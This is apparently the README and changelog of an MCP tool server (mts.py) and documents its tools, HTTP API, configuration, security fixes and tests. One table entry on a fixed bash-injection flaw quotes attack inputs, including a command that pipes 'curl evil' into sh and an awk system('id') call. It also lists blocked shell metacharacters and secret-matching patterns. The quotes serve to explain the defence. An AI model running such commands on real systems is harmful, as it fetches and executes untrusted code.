# mts.py — MCP Tool Server v4.2.0

A single-file MCP tool server with a standard-library core (PyYAML and psutil are optional) that
speaks both **JSON-RPC 2.0 (MCP `2024-11-05`)** and a **plain REST** dialect over HTTP. v4.2.0 is
a correctness-and-capability pass over **every registered tool** (see §0). Subsequent filesystem
updates add `read_lines` and `replace_lines`, bringing the registry to **97 tools**.

```bash
python3 mts.py                      # start the server
python3 mts.py --port 9000          # start on another port
python3 mts.py --list-tools         # dump the registry
python3 mts.py --self-test          # internal diagnostics, exit 0/1
python3 mts.py --call web_search '{"query":"rust async runtime","max_results":5}'
python3 -m unittest tests.test_mts -v  # 86 offline tests (no external network required)
python3 -m unittest discover -s tests -p "test_mts*.py" -v  # all offline MCP tests
```

### File reading, writing and editing

All file paths are resolved inside `MCP_SANDBOX_ROOT`. For example:

```bash
export MCP_SANDBOX_ROOT="$HOME/mcp-workspace"
python3 mts.py --call write_file '{"filepath":"notes.txt","content":"first\nsecond\nthird\n","overwrite":false}'
python3 mts.py --call read_lines '{"filepath":"notes.txt","start_line":2,"end_line":3}'
python3 mts.py --call replace_lines '{"filepath":"notes.txt","start_line":2,"end_line":3,"content":"updated\nreplacement","expected_content":"second\nthird\n","create_backup":true}'
python3 mts.py --call replace_lines '{"filepath":"notes.txt","start_line":2,"end_line":2,"content":"","dry_run":true}'
```

* `read_lines` takes **1-based, inclusive** bounds and returns both numbered `lines` and the
  `content` of UTF-8 text, including original CRLF, LF or CR endings. It returns the available
  lines when the end is past EOF; a start past EOF returns an empty result. A request may cover
  at most 20,000 lines and returns at most `MAX_TEXT_CHARS` characters. `has_more` refers to the
  rest of the file. Use `next_start_line` to page when available. `content_truncated` indicates
  the character limit cut the requested range short; `partial_line=true` means a single line was
  cut and cannot be resumed by line number. `read_file` retains its existing `start_line`/
  `line_count` interface and normalized-newline default; set `preserve_line_endings=true` for
  exact line endings. Skipping to a later start is limited to scanning 32 MiB, and `total_lines`
  can be unknown for larger files. These readers replace invalid UTF-8 bytes with the replacement
  character.
* `replace_lines` requires an existing range and replaces the **entire** selected lines. Empty
  `content` deletes them. Replacement line endings are normalized to the selected range's style;
  when the old range ended with a newline, a non-empty replacement gets the same terminating
  newline if it did not supply one. Untouched portions retain their original bytes, and a UTF-8
  BOM is retained on non-empty files. Pass the exact `content` from `read_lines` as
  `expected_content` to reject a changed range. This is a check before writing, **not** a lock or
  atomic compare-and-swap; concurrent writers can still race.
  `dry_run=true` reports a bounded preview without changing files or making backups.
* `edit_file_replace` remains available for exact or whitespace-tolerant snippet replacement;
  it now also accepts `dry_run` and `create_backup`. Both edit tools reject files containing NUL
  bytes or invalid UTF-8 instead of silently corrupting them. They limit the original to 32 MiB and the
  resulting file to 64 MiB; request-size limits also apply to replacement text.
* `write_file` still overwrites by default. Use `overwrite=false` for an atomic create-only write;
  it fails safely on filesystems that do not support hard links. `create_backup=true` copies an
  existing file to `<path>.bak` (replacing any previous backup).
  The edit tools support the same backup option. Atomic overwrites preserve ordinary permission
  bits, including executability; special setuid/setgid/sticky bits are not carried forward.
  `append_to_file` selects the recent newline style for a needed separator when available in the
  file's tail. These operations retain the sandbox path checks and existing request-size limits.

---

## 0. What v4.2 fixed and added (tool-by-tool audit)

| Area | Problem in v4.1 | v4.2 behaviour |
|------|-----------------|----------------|
| `csv_to_json` | Delimiter auto-detection never ran: the default `delimiter=","` is truthy, so `csv.Sniffer()` was always skipped. Semicolon/tab exports silently became a single column. A UTF-8 BOM ended up inside the first column name. | Detects `,` `;` tab `|` when the default comma cannot split the header (or with `delimiter="auto"`), honours explicitly requested separators, strips BOMs, pads ragged rows into `_extra`, and reports `delimiter_autodetected`, `had_bom` and `duplicate_columns`. |
| `text_stats` | Flesch score divided a syllable count taken from the first 20,000 words by the *total* word count — a 120k-word text scored 174.6 (impossible). Non-ASCII words were counted as zero. | Readability uses one consistent sample (reported via `readability_sampled_words` / `readability_estimated`), adds `flesch_kincaid_grade` and `reading_level`, and counts Unicode words (`naïve`, `日本語`, `don't`). |
| `url_encode_decode` | `component` only affected encoding; decoding always used `unquote_plus`, turning `+` into a space inside full URLs. | `component=false` decodes with `unquote`, preserving literal `+`. |
| `jwt_decode` | An out-of-range `exp`/`iat`/`nbf` (e.g. `1e30`) raised inside `fromtimestamp` and failed the whole decode. | Claims are range-checked and reported in `warnings`; adds `algorithm`, `claims`, `not_yet_valid`, `issued_in_future` and an `alg: none` warning. |
| `base64_encode_decode` | Line-wrapped (PEM/JSON) input was rejected as invalid. | CR/LF are stripped (interior spaces still rejected) and `line_breaks_stripped` is reported. |
| `hash_text` | SHAKE digests were always 32 bytes with no way to choose the length; SHAKE + HMAC failed obscurely. | Adds `length` (16–512 bytes) and an explicit error for HMAC with XOF algorithms. |
| `uuid_generate` | v5 was hardcoded to the DNS namespace. | Adds `namespace` (`dns`/`url`/`oid`/`x500`/literal UUID) with the resolved namespace echoed. |
| `random_string` | No way to avoid `0/O/1/l/I`; the `password` preset could return all-lowercase tokens. | Adds `exclude_ambiguous`, and short `password`/`alphanumeric` tokens always contain every character class at distinct positions. |
| `current_datetime` | Only fixed UTC offsets were supported. | Adds `timezone` (IANA via `zoneinfo`), plus `utc_offset`, `dst`, `iso_week`, `day_of_year` and `quarter`. |
| `timestamp_convert` | Milliseconds were guessed from a single magnitude threshold. | Adds `unit` (`auto`/`s`/`ms`/`us`/`ns`), wider auto-detection, `rfc2822`/`rfc3339`/`date`/`time` outputs, `age_human`, `is_future` and a clear error for out-of-range values. |
| `text_diff_compare` | No way to ignore whitespace or case. | Adds `ignore_whitespace` / `ignore_case`; `identical` now reflects the computed diff. |
| `append_to_file` | Appending to a file without a trailing newline produced `abcdef`. | Inserts a separator newline (disable with `ensure_newline=false`) and reports `added_separator_newline`. |
| `edit_file_replace` | Only byte-exact matching; indentation drift from a model produced "not found". | Falls back to whitespace-insensitive line matching when the target is unique, re-indents the replacement to the matched block, and reports `match_mode`. |
| `list_directory` | `sort_by=name` did not sort at all (filesystem order); unknown values were ignored silently. | Always sorted, validates `sort_by` (name/name_desc/size/modified/type/extension), and reports `sort_by` + `total_size_bytes`. |
| `write_file` / `file_checksum` / `disk_usage` / `file_stat` | No created/overwritten signal, no digest verification, partial totals were unlabelled, `created` silently meant `st_ctime`. | `write_file` reports `created`/`previous_bytes`; `file_checksum` accepts `expected` → `matches`; `disk_usage` reports `total_size_complete` + excluded directories; `file_stat` documents ctime and exposes `birth_time` where available. |
| `http_request` | No default `User-Agent`/`Accept` (many sites 403), redirects were always followed, no timing. | Sends default headers (overridable), adds `allow_redirects`, `redirected` and `elapsed_ms`. |
| `fetch_json_api` / `web_download_file` | Timeouts were not configurable. | Add `timeout_seconds`; downloads also report `elapsed_ms` and `throughput_kbps`. |
| `check_url_status` / `port_check` | Latency used wall-clock `time.time()`, so clock jumps skewed results. | Timing is monotonic. |
| `process_list` | Sorted only the first N processes it happened to iterate over — the heaviest processes could be missing entirely. | Collects (bounded), then sorts by memory/CPU before truncating; the `ps` fallback parses and sorts the same way. |
| `parse_robots_txt` | Accepted `url=` but never evaluated it against the rules. | Reports `allowed`, `matched_rule` and `checked_path` using RFC 9309 longest-match/Allow-wins semantics (`*` and `$` supported). |
| `search_files` | Only basenames matched, so `pkg/*.py` returned nothing. | Matches basenames *and* paths relative to the search root. |
| `memory_store` / `memory_search` | No distinction between create and overwrite; no tag filter while searching. | Reports `created`/`overwritten`/`previous_bytes`; search adds `tag`, `matched_in` and is ordered by recency. |
| `wikipedia_lookup` / `arxiv_search` / `stackexchange_search` | Invalid language codes, sort keys and site slugs only failed after a network round-trip with a confusing transport error. | All three validate input first and return actionable errors with supported values. |
| `list_tools` / `tool_help` | Generated JSON Schema had no parameter descriptions and stringified example values. | Every property now carries a description; examples are correctly typed; `requires_dangerous_mode` is exposed. |
| **New** `regex_replace` | Only search existed; transforming text required code execution. | Bounded, out-of-process substitution with backreferences, flags, `max_replacements`, ReDoS guard and a 5 s limit. |
| **New** `git_show` | `git_log`/`git_diff` could not show a specific commit. | Commit metadata, changed-file stat and a bounded patch for any validated revision. |

---

## 1. What was broken in v3.8 (and is now fixed)

| # | Severity | Problem | Fix |
|---|----------|---------|-----|
| 1 | Critical | `safe_execute_python` was **100 % non-functional** — the wrapper called `__builtins__.clear()`, which raises `AttributeError` in `__main__` before user code ran. The AST denylist was also bypassable (`getattr`, string-built imports, `importlib`, `ctypes`, `pathlib`…). | Replaced by a real sandbox runner: **allow-list** of builtins *and* modules, a guarded `__import__`, `python -I -S`, a clean env, and POSIX `rlimit`s (CPU, address space, file size, core). AST validation is now allow-list based. |
| 2 | Critical | `_read_limited_response` could never detect truncation (`total > limit` was unreachable because reads were capped at `limit - total`) → `web_download_file` wrote **silently corrupted** files >2 MB and reported `"success"`. | `_read_stream_limited()` returns `(data, truncated)` by probing one extra byte; `web_download_file` streams to `*.part`, checks `Content-Length`, aborts loudly, and returns a SHA-256. |
| 3 | Critical | `_cfg_val` did `cast_type(value)` for config-file values, so `"require_auth": "false"` became **`True`**. | `_to_bool()` is used for both config-file and env values. |
| 4 | Critical | `execute_bash_command` ran `shell=True` and only inspected `tokens[0]` — `"echo hi\ncurl evil \| sh"` executed both lines; `awk 'BEGIN{system("id")}'` contained no blocked substring; `rm`/`chmod` were whitelisted; `>` was unblocked. | **No shell at all.** `shlex.split`, metacharacter rejection (`; & \| \` $ > < newline ( ) { } \\ !`), allow-list on the resolved binary, per-argument sandbox checks, `rm/chmod/dd/...` only with `allow_destructive_bash`, rlimits applied. |
| 5 | Critical | SSRF: the guard ran only *before* the request; `urlopen` then followed redirects with no per-hop check (`http_request`, `fetch_json_api`, `web_download_file`, `parse_url_headers`). `_host_is_private` **failed open** when DNS raised `OSError`. | `_SafeRedirectHandler` validates **every hop** and strips `Authorization`/`Cookie` across hosts; `_host_is_private` **fails closed**; IPv4-mapped IPv6, 6to4, Teredo, unspecified and metadata hosts are covered, and the connection uses the validated DNS address. |
| 6 | High | `get_environment_variable(name=...)` bypassed the secret filter → `MCP_API_TOKEN` was readable. | Named lookups are redacted too; revealing requires `MCP_ENABLE_DANGEROUS=true` **and** `reveal_secrets=true`. |
| 7 | High | Auth: `==` token comparison, empty token authenticated `"Bearer "`, `?token=` was accepted *and logged*, `GET /tools` was unauthenticated. | `hmac.compare_digest`, empty token ⇒ deny + error log, `?token=` opt-in only (`allow_token_in_query`), all endpoints except `/health` require auth, logs are redacted. |
| 8 | High | `set_environment_variable` could set `PATH`/`LD_PRELOAD` ⇒ code execution. | Protected-name denylist + `MCP_*` lockout + identifier validation. |
| 9 | High | `compress_decompress_archive` was zip-slip vulnerable, and "create" produced `x.tar.tar.gz`. | Members validated against the target root; symlink/hardlink/device members rejected; `filter="data"` on 3.12+; correct suffix handling + explicit `format=`. |
| 10 | Medium | `check_url_status` returned an error instead of the status code for 4xx/5xx. | `HTTPError` captured in both HEAD and GET paths; adds `status_class`, `redirected`, timing. |
| 11 | Medium | `rss_feed_parse` returned `link: null` for RSS 2.0 (`<link>text</link>`; only `href` was read). | `href` **or** text node; plus enclosures, categories, author, feed title. |
| 12 | Medium | `apply_patch` silently overwrote the whole file when the input wasn't a diff. | Requires `mode="replace"` to overwrite; real patches are backed up and rolled back on failure. |
| 13 | Medium | `web_search` hardcoded `safe_search = False` (discarding the parameter) and ignored `page` for DDG. | Safe-search and pagination are honoured per engine (see §2). |
| 14 | Medium | `file_checksum` fell back to SHA-256 while echoing the requested algorithm name; `"new"` crashed. | Validated against `hashlib.algorithms_available`, explicit error otherwise. |
| 15 | Medium | `search_file_content` matched every line for an empty query, had no depth cap, and read binaries. | Empty query rejected, `max_depth`/`max_results`/`context_chars`, binary + >8 MB files skipped, VCS dirs pruned. |
| 16 | Medium | `lint_code` shell check was inverted (it *required* a whitelisted word rather than rejecting bad ones). | Dropped — `bash -n` only parses. Python linting now reports unused imports, bare `except`, `is`-literal comparisons, functions/classes. |
| 17 | Medium | Telemetry double-counted exec tools under mismatched keys (`python_exec` vs `execute_python_code`) and recorded success on non-zero exits. | Recorded once, centrally, in `call_tool()`; success is derived from the tool's own `error` field. |
| 18 | Medium | `_save_memory` was a non-atomic truncating write (crash = lost store). | Temp file + `os.replace`, size cap, corrupt-file recovery. |
| 19 | Low | Dead code: `_fetch_url`'s `for _ in range(6)` and `read_url_hardened`'s hop loop never iterated; `_retry_on_exception` never fired (URLError was re-raised as `RuntimeError` inside); `_cache_get/_cache_set` had zero callers. | Redirect handling moved into the opener; retries work (and skip `HTTPError`); the TTL cache now backs search + fetch and is bounded, with `cache_stats`/`cache_clear`. |
| 20 | Low | `file_tree` never drew `└──`, had an unclamped depth and unbounded output; `_extract_html_details` never called `parser.close()`; `_build_mcp_input_schema` rejected negative defaults; the handler passed raw client kwargs to `func(**args)` (unknown key ⇒ 500, `"true"` for bools). | All fixed; arguments are now validated and coerced against `TOOL_SCHEMAS` with "did you mean" suggestions. |
| 21 | Bonus | `temporary_file()` exposed an integer fd as `tf.name`, breaking subprocess callers that need a filesystem path. | Uses `NamedTemporaryFile` to retain exclusive creation while exposing a string path. |
| 22 | High | DNS validation followed by a regular URL open left a rebinding window; archive listing, table parsing, and converter inputs could grow without practical bounds. | Pin vetted IP addresses at the socket layer; cap tool request sizes, XML/YAML expansion, HTML tables, archive entries, subprocess output and caches. |
| 23 | High | Image/search parsers passed through untrusted result URLs, and generated Markdown could emit active schemes. | Normalize and validate extracted result URLs as HTTP(S); sanitize image and thumbnail URLs and restrict Markdown links. |
| 24 | Medium | Process environment and memory tool inputs could be oversized or allow dangerous configuration mutation. | Protect execution/network-related environment names; cap environment names/values, memory keys/values/tags, and return redacted secrets by default. |

---

## 2. The new web-search stack

`web_search` is now a parallel, multi-engine, rank-fusing pipeline.

```jsonc
{"tool": "web_search", "args": {
  "query": "postgres vacuum tuning",
  "max_results": 8,
  "engines": "auto",        // auto | all | "bing,duckduckgo,mojeek,brave,..."
  "page": 1,                 // real pagination per engine
  "domain": "postgresql.org",// becomes site:postgresql.org
  "safe_search": false,      // actually honoured now
  "time_range": "month",     // day | week | month | year (aliases: 24h, 7d, 30d, y, ...)
  "region": "us-en",
  "fetch_content": true,     // also fetch + extract the top 5 pages in parallel
  "content_chars": 2000,
  "use_cache": true          // TTL cache, default 300 s
}}
```

* **Engines** — keyless: `duckduckgo` (POST html), `duckduckgo_lite`, `bing`, `mojeek`, `wikipedia`.
  Keyed (auto-enabled when configured): `brave`, `google_cse`, `tavily`, `serpapi`, `searxng`.
* **Parallel + fault isolated** — engines run in a thread pool; a failing engine is reported in
  `engine_errors` and never blocks the others. If the selected set yields nothing, a fallback set
  is tried automatically.
* **Reciprocal-rank fusion** — results agreeing across engines float to the top
  (`score`, `engines`, `position` are returned per result), with per-engine quality weights.
* **De-duplication** — URLs are canonicalised (scheme/`www.`/`m.`/trailing slash/`index.html`,
  and 20+ tracking params like `utm_*`, `fbclid`, `gclid` stripped) before merging.
* **Redirector unwrapping** — DuckDuckGo `uddg=`, Bing `u=a1<base64>`, Google/Yandex `url=`.
* **Scrapers are attribute-order independent** (v3.8's regexes assumed `class` came before
  `href`, which silently broke lite.duckduckgo.com) and covered by offline fixtures in the tests.

### Companion search tools

| Tool | What it does |
|------|--------------|
| `web_search_news` | Google News RSS + Bing News RSS, merged, de-duplicated by URL *and* title, `time_range` aware |
| `web_search_images` | DuckDuckGo `i.js` (with vqd token) and a Bing Images fallback |
| `web_search_answer` | DuckDuckGo Instant Answer + Wikipedia summary + top organic results |
| `web_search_suggestions` | Autocomplete/related queries (DDG + Bing) |
| `wikipedia_lookup` | REST summary with search fallback and disambiguation handling |
| `arxiv_search` | arXiv Atom API (title, authors, abstract, PDF link, categories) |
| `github_search` | repositories / code / issues / users / commits / topics (uses `GITHUB_TOKEN` when set) |
| `stackexchange_search` | Stack Overflow & friends, with question bodies |
| `research_topic` | **One-shot pipeline**: search → domain-diversified source pick → parallel fetch → per-source key points + an overall extractive brief + keywords (optionally news) |
| `fetch_many_urls` | Fetch up to 20 URLs in parallel, as text or Markdown |
| `url_to_markdown` | Readable Markdown conversion of any page |

---

## 3. Tool registry (97 tools)

| Category | Tools |
|----------|-------|
| **search** (10) | `web_search`, `web_search_news`, `web_search_images`, `web_search_answer`, `web_search_suggestions`, `wikipedia_lookup`, `arxiv_search`, `github_search`, `stackexchange_search`, `research_topic` |
| **web** (22) | `fetch_many_urls`, `url_to_markdown`, `fetch_webpage_text`, `http_request`, `fetch_json_api`, `web_download_file`, `web_scrape_links`, `extract_metadata`, `dns_lookup`, `check_url_status`, `parse_url_headers`, `read_url_hardened`, `sitemap_parse`, `rss_feed_parse`, `whois_lookup`, `port_check`, `parse_html_document`, `extract_structured_data`, `parse_html_tables`, `extract_media_links`, `parse_robots_txt`, `discover_feed_links` |
| **files** (20) | `read_file`, `read_lines`, `write_file`, `edit_file_replace`, `replace_lines`, `append_to_file`, `list_directory`, `file_stat`, `delete_file`, `make_directory`, `copy_file`, `move_file`, `file_checksum`, `search_files`, `search_file_content`, `file_tree`, `disk_usage`, `compress_decompress_archive`, `archive_list`, `apply_patch` |
| **execution** (6) | `lint_code`, `execute_python_code`, `execute_javascript_code`, `execute_bash_command`, `safe_execute_python`, `process_list` |
| **data** (19) | `json_parse_validate`, `json_query`, `regex_search`, `regex_replace`, `base64_encode_decode`, `url_encode_decode`, `hash_text`, `uuid_generate`, `random_string`, `current_datetime`, `timestamp_convert`, `jwt_decode`, `csv_to_json`, `json_to_csv`, `yaml_json_convert`, `text_diff_compare`, `text_stats`, `text_summarize`, `parse_url` |
| **git** (4) | `git_status`, `git_diff`, `git_log`, `git_show` |
| **memory** (5) | `memory_store`, `memory_recall`, `memory_list`, `memory_delete`, `memory_search` |
| **system** (11) | `ping`, `health_check`, `system_info`, `server_stats`, `self_diagnostics`, `cache_stats`, `cache_clear`, `list_tools`, `tool_help`, `get_environment_variable`, `set_environment_variable` |

**All 54 v3.8 tool names and parameter names still work** — new parameters are optional additions.
Every tool returns JSON with an `ok` boolean, or an `error` string on failure.

Discover tools at runtime: `list_tools` (filter by `category`/`filter`), `tool_help` (full
docstring + JSON Schema + a call example), `GET /tools`, `GET /tools/detailed`, or JSON-RPC
`tools/list`.

---

## 4. HTTP API

| Endpoint | Auth | Purpose |
|----------|------|---------|
| `GET /health`, `/healthz`, `/ping` | public | readiness probe |
| `GET /`, `/tools`, `/mcp` | yes | compact registry |
| `GET /tools/detailed` | yes | MCP descriptors + JSON Schemas |
| `GET /stats` | yes | full telemetry |
| `GET /diagnostics` | yes | self-check report |
| `POST /` | yes | JSON-RPC 2.0 **or** `{"tool": "...", "args": {...}}` |
| `POST /<tool_name>` | yes | REST style, body = arguments |

```bash
# JSON-RPC (MCP client)
curl -s localhost:8000 -H 'Authorization: Bearer $TOKEN' -d '{
  "jsonrpc":"2.0","id":1,"method":"tools/call",
  "params":{"name":"research_topic","arguments":{"query":"CRDT vs OT","max_sources":4}}}'

# REST
curl -s localhost:8000/web_search -H 'Authorization: Bearer $TOKEN' \
     -d '{"query":"sqlite wal mode","max_results":5}'
```

Auth accepts `Authorization: Bearer <token>` or `X-API-Key: <token>` (constant-time compare).

---

## 5. Configuration

Precedence: **`$MCP_SANDBOX_ROOT/mts_config.json` → environment variable → default.**
See `mts_config.example.json`.

| Key / Env | Default | Notes |
|-----------|---------|-------|
| `bind_host` / `MCP_BIND_HOST` | `0.0.0.0` | set `127.0.0.1` when running without auth |
| `http_port` / `MCP_HTTP_PORT` | `8000` | |
| `require_auth` / `MCP_REQUIRE_AUTH` | `false` | empty token + auth ⇒ everything is rejected |
| `api_token` / `MCP_API_TOKEN` | `""` | |
| `allow_token_in_query` / `MCP_ALLOW_TOKEN_IN_QUERY` | `false` | `?token=` support, off by default |
| `enable_dangerous` / `MCP_ENABLE_DANGEROUS` | `false` | gates the 4 execution tools |
| `allow_destructive_bash` / `MCP_ALLOW_DESTRUCTIVE_BASH` | `false` | adds `rm`, `chmod`, `dd`, … |
| `allowed_bash_commands` / `MCP_ALLOWED_BASH_COMMANDS` | see example | comma list or JSON array |
| `allow_private_networks` / `MCP_ALLOW_PRIVATE_NETWORKS` | `false` | relaxes SSRF guard (metadata hosts stay blocked) |
| `blocked_hosts` / `MCP_BLOCKED_HOSTS` | cloud metadata hosts | always blocked |
| `sandbox root` / `MCP_SANDBOX_ROOT` | Termux home → `~/.mcp_sandbox` → tmp | falls back automatically if unwritable |
| `search_engines` / `MCP_SEARCH_ENGINES` | `auto` | `auto`, `all`, or a comma list |
| `search_cache_ttl`, `fetch_cache_ttl`, `cache_max_entries` | `300`, `120`, `512` | TTL cache |
| `max_http_bytes`, `max_download_bytes`, `max_text_chars`, `http_timeout` | 2 MB, 64 MB, 64 000, 15 s | |
| `brave_api_key`, `tavily_api_key`, `serpapi_key`, `google_api_key`+`google_cse_id`, `searxng_url`, `github_token` | `""` | enable the corresponding engines automatically |

---

## 6. Security model

* **Filesystem** — every path goes through `_safe_path` (realpath + `commonpath` against the
  sandbox root, null-byte and traversal rejection); relative paths resolve *inside* the sandbox.
* **Network** — scheme/credential validation, DNS-resolved IP classification (private, loopback,
  link-local, reserved, multicast, unspecified, IPv4-mapped/6to4/Teredo), metadata-host denylist,
  per-redirect re-validation, DNS-pinned socket connections, credential stripping across hosts,
  and byte caps on every read. `allow_private_networks=false` remains the recommended setting.
* **Execution** — disabled by default. `safe_execute_python` uses allow-lists + `rlimit`s;
  `execute_bash_command` never invokes a shell.
* **Secrets** — env values matching `token|key|secret|auth|pwd|password|credential|session|cookie|private`
  are redacted in tool output and in the access log; `Bearer`/`token=` patterns are scrubbed from logs.
* **Recommended production start:**
  ```bash
  MCP_REQUIRE_AUTH=true MCP_API_TOKEN="$(openssl rand -hex 32)" \
  MCP_BIND_HOST=127.0.0.1 python3 mts.py
  ```

---

## 7. Tests

`tests/test_mts.py` — 86 offline tests, no external network required:

* search scrapers against recorded Bing/DDG/DDG-lite/Mojeek fixtures, redirector unwrapping,
  engine-failure isolation, rank fusion + URL canonicalisation, summariser relevance;
* truncation detection, SSRF host classification, fail-closed DNS, DNS-rebinding protection,
  URL validation, and safe XML/Markdown parsing;
* sandbox traversal, zip-slip, archive limits/list truncation, `apply_patch` rollback,
  file/tree/checksum behaviour;
* sandbox-escape attempts against `safe_execute_python`, bash injection payloads, bounded
  subprocess output and timeout handling;
* data/text/memory/HTML/RSS tools; registry & schema consistency; request-size validation;
* a **loopback HTTP fixture** for redirects (including a blocked metadata redirect), download
  limits, 5xx handling, Markdown conversion, parallel fetching and the end-to-end `web_search`
  pipeline with caching;
* the real `Handler` over a loopback socket: auth, JSON-RPC `initialize`/`tools/list`/`tools/call`,
  REST path calls, 404/413 handling.

`tests/test_mts_tool_coverage.py` additionally invokes all **97 registered tools** against
in-memory or local fixtures (including search, DNS, WHOIS, and file tools) with no external
services or credentials.

`tests/test_mts_file_tools.py` covers numbered reads, line-range replacements and deletions,
newlines, permissions, backups, stale-content checks, dry runs, limits, sandbox safety, and
CLI/JSON-RPC discovery and invocation.

`tests/test_mts_upgrades.py` adds **39 regression tests** that pin every v4.2 behaviour: CSV
delimiter/BOM handling, readability maths, decode semantics, JWT edge cases, generator
guarantees, timezone/epoch handling, append/edit/directory/checksum/disk behaviour, top-N
process ordering, robots.txt evaluation, `regex_replace`, `git_show` (against a throwaway repo),
`http_request` headers/redirect control (against a loopback fixture) and schema descriptions.
